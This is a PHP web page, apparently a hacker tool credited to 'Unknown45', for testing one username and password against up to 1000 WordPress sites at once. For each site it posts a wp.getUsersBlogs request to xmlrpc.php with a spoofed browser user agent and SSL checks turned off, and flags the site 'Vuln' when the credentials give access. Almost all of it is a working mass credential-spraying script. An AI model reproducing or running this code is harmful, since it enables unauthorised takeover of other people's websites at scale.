<html>
<head>
<title>[+] Mass WP u/p XMLRPC [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');
   @import url('https://fonts.googleapis.com/css?family=Helvetica');


textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

input[type="text"] {
  font-family: 'Helvetica';
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

vuln {
  color: green;
}

kgk {
  color: red;
}

error {
  color: yellow;
}
</style>
<body>
<center>
<font face=courier new size=5>Mass Wordpress u/p XMLRPC<br><font size="3">Mass Wordpress Dengan User dan Password sendiri versi XMLRPC</font><font size="3"><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id/wp/" required="true"></textarea><br><br>
User : <input type="text" name="user" required="true"><br>
Pass : <input type="text" name="pass" required="true"><br><br>
<input type="submit" name="go" value="Gaskan">
</form>
</font>
</font>
<?php
if (isset($_POST['go'])) {
  $user = $_POST['user'];
  $pass = $_POST['pass'];
  $url = $_POST['url'];
  $url = explode("\r\n", $url);
  if (count($url) > 1000) {
    die("[!] Maximal 1000 Web per submit !");
  }
  //print_r($url);
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  echo "[+] user : ".htmlspecialchars($user)."<br>";
  echo "[+] pass : ".htmlspecialchars($pass)."<br><br>";
  echo "[+] total web : ".count(array_unique($url))."<br><br>";
  ob_implicit_flush();ob_end_flush();
  foreach ($url as $web) {
    $webnya = htmlspecialchars($web);
    if (strpos($web, "xmlrpc.php") === false) {
      $web = $web."/xmlrpc.php";
    }
    $web = str_replace("///", "/", $web);
    $web = str_replace("//", "/", $web);
    $web = str_replace("https:/", "https://", $web);
    $web = str_replace("http:/", "http://", $web);
    $ekse = post($web, $user, $pass);
    if (preg_match("/<name>isAdmin<\/name>/i", $ekse)) {
      echo "[<vuln>Vuln</vuln>] ".$webnya."<br>";
    } elseif (preg_match("/<name>faultString<\/name>/i", $ekse)) {
      echo "[<kgk>Not Vuln</kgk>] ".$webnya."<br>";
    } elseif (preg_match("/403 Forbidden/i", $ekse)) {
      echo "[<error>403 Forbidden</error>] ".$webnya."<br>";
    } elseif (preg_match("/Not Found/i", $ekse)) {
      echo "[<kgk>XMLRPC Not Found</kgk>] ".$webnya."<br>";
    } else {
      echo "[<kgk>Unknown Error</kgk>] ".$webnya."<br>";
    }
  }
}

function post($url, $user, $pass) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36");
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '<?xml version="1.0" encoding="UTF-8"?><methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value>'.$user.'</value></param> <param><value>'.$pass.'</value></param> </params> </methodCall>');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
  curl_setopt($ch, CURLOPT_POSTREDIR, 3);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20); 
  curl_setopt($ch, CURLOPT_TIMEOUT, 20);
  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  $ekse = curl_exec($ch);
  return $ekse;
}
echo "</pre>";
?>
</font>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>